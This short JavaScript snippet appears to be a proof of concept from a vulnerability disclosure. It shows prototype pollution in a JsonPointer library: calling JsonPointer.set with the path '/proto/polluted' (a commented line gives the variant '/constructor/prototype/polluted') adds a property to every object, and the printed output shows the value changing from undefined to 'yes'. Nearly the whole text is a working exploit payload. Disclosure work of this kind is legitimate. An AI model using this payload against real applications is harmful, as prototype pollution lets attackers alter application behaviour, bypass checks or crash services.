console.log("Before : " + obj.polluted);
// JsonPointer.set({}, '/constructor/prototype/polluted', "yes", true);
JsonPointer.set({}, '/proto/polluted', "yes", true);
console.log("After : " + obj.polluted);Observed output:Before : undefined
After : yes

